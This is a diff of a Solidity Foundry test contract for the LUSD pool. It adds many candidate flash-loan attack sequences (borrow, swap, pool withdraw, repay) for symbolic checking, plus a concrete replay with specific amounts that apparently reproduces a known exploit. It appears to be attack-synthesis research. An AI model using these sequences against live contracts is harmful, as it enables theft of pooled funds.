@@ -294,7 +294,7 @@ contract LUSDTest is Test, BlockLoader {
         loan.supply(address(btcb), amount);
     }
 
-    function burn_lusd_lusdpool(uint256 amount) internal eurus {
+    function withdraw_lusdpool_lusd_usdt(uint256 amount) internal eurus {
         lusd.approve(address(lusdpool), type(uint256).max);
         lusdpool.withdraw(amount);
     }
@@ -342,6 +342,89 @@ contract LUSDTest is Test, BlockLoader {
         uint256 amt3,
         uint256 amt4,
         uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pairub_attacker_usdt_btcb(amt1, amt2);
+        swap_loan_attacker_btcb_lusd(amt3, amt4);
+        withdraw_lusdpool_lusd_usdt(amt5);
+        payback_usdt_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand003(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt8 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pairub_attacker_usdt_btcb(amt1, amt2);
+        swap_loan_attacker_btcb_lusd(amt3, amt4);
+        withdraw_lusdpool_lusd_usdt(amt5);
+        swap_pairub_attacker_btcb_usdt(amt6, amt7);
+        payback_usdt_owner(amt8);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand004(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_lusd_owner(amt0);
+        withdraw_lusdpool_lusd_usdt(amt1);
+        swap_pairub_attacker_usdt_btcb(amt2, amt3);
+        swap_loan_attacker_btcb_lusd(amt4, amt5);
+        payback_lusd_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand005(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt6 >= amt0);
+        borrow_btcb_owner(amt0);
+        swap_loan_attacker_btcb_lusd(amt1, amt2);
+        withdraw_lusdpool_lusd_usdt(amt3);
+        swap_pairub_attacker_usdt_btcb(amt4, amt5);
+        payback_btcb_owner(amt6);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand006(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
         uint256 amt6,
         uint256 amt7,
         uint256 amt8,
@@ -359,7 +442,7 @@ contract LUSDTest is Test, BlockLoader {
         vm.stopPrank();
     }
 
-    function check_cand003(
+    function check_cand007(
         uint256 amt0,
         uint256 amt1,
         uint256 amt2,
@@ -383,6 +466,220 @@ contract LUSDTest is Test, BlockLoader {
         vm.stopPrank();
     }
 
+    function check_cand008(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pairub_attacker_usdt_btcb(amt1, amt2);
+        swap_pairub_attacker_btcb_usdt(amt3, amt4);
+        swap_pairub_attacker_usdt_btcb(amt5, amt6);
+        swap_loan_attacker_btcb_lusd(amt7, amt8);
+        withdraw_lusdpool_lusd_usdt(amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand009(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pairub_attacker_usdt_btcb(amt1, amt2);
+        swap_loan_attacker_btcb_lusd(amt3, amt4);
+        withdraw_lusdpool_lusd_usdt(amt5);
+        swap_pairub_attacker_usdt_btcb(amt6, amt7);
+        swap_pairub_attacker_btcb_usdt(amt8, amt9);
+        payback_usdt_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand010(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_lusd_owner(amt0);
+        withdraw_lusdpool_lusd_usdt(amt1);
+        swap_pairub_attacker_usdt_btcb(amt2, amt3);
+        swap_pairub_attacker_btcb_usdt(amt4, amt5);
+        swap_pairub_attacker_usdt_btcb(amt6, amt7);
+        swap_loan_attacker_btcb_lusd(amt8, amt9);
+        payback_lusd_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand011(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_btcb_owner(amt0);
+        swap_pairub_attacker_btcb_usdt(amt1, amt2);
+        swap_pairub_attacker_usdt_btcb(amt3, amt4);
+        swap_loan_attacker_btcb_lusd(amt5, amt6);
+        withdraw_lusdpool_lusd_usdt(amt7);
+        swap_pairub_attacker_usdt_btcb(amt8, amt9);
+        payback_btcb_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand012(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt10 >= amt0);
+        borrow_btcb_owner(amt0);
+        swap_loan_attacker_btcb_lusd(amt1, amt2);
+        withdraw_lusdpool_lusd_usdt(amt3);
+        swap_pairub_attacker_usdt_btcb(amt4, amt5);
+        swap_pairub_attacker_btcb_usdt(amt6, amt7);
+        swap_pairub_attacker_usdt_btcb(amt8, amt9);
+        payback_btcb_owner(amt10);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand013(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_usdt_owner(amt0);
+        swap_pairub_attacker_usdt_btcb(amt1, amt2);
+        swap_loan_attacker_btcb_lusd(amt3, amt4);
+        withdraw_lusdpool_lusd_usdt(amt5);
+        swap_pairub_attacker_usdt_btcb(amt6, amt7);
+        swap_loan_attacker_btcb_lusd(amt8, amt9);
+        withdraw_lusdpool_lusd_usdt(amt10);
+        payback_usdt_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand014(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_lusd_owner(amt0);
+        withdraw_lusdpool_lusd_usdt(amt1);
+        swap_pairub_attacker_usdt_btcb(amt2, amt3);
+        swap_loan_attacker_btcb_lusd(amt4, amt5);
+        withdraw_lusdpool_lusd_usdt(amt6);
+        swap_pairub_attacker_usdt_btcb(amt7, amt8);
+        swap_loan_attacker_btcb_lusd(amt9, amt10);
+        payback_lusd_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
+    function check_cand015(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7,
+        uint256 amt8,
+        uint256 amt9,
+        uint256 amt10,
+        uint256 amt11
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt11 >= amt0);
+        borrow_btcb_owner(amt0);
+        swap_loan_attacker_btcb_lusd(amt1, amt2);
+        withdraw_lusdpool_lusd_usdt(amt3);
+        swap_pairub_attacker_usdt_btcb(amt4, amt5);
+        swap_loan_attacker_btcb_lusd(amt6, amt7);
+        withdraw_lusdpool_lusd_usdt(amt8);
+        swap_pairub_attacker_usdt_btcb(amt9, amt10);
+        payback_btcb_owner(amt11);
+        assert(!attackGoal());
+        vm.stopPrank();
+    }
+
     function test_gt() public {
         vm.startPrank(attacker);
         borrow_usdt_owner(980925 * 1e18);
@@ -394,7 +691,7 @@ contract LUSDTest is Test, BlockLoader {
         printBalance("After step1 ");
         swap_loan_attacker_btcb_lusd(1515366635982742, 10000 * 1e18);
         printBalance("After step2 ");
-        burn_lusd_lusdpool(lusd.balanceOf(attacker));
+        withdraw_lusdpool_lusd_usdt(lusd.balanceOf(attacker));
         printBalance("After step3 ");
         swap_pairub_attacker_btcb_usdt(
             btcb.balanceOf(attacker),
@@ -423,7 +720,7 @@ contract LUSDTest is Test, BlockLoader {
         borrow_usdt_owner(amt0);
         swap_pairub_attacker_usdt_btcb(amt1, amt2);
         swap_loan_attacker_btcb_lusd(amt3, amt4);
-        burn_lusd_lusdpool(amt5);
+        withdraw_lusdpool_lusd_usdt(amt5);
         swap_pairub_attacker_btcb_usdt(amt6, amt7);
         payback_usdt_owner(amt8);
         assert(!attackGoal());
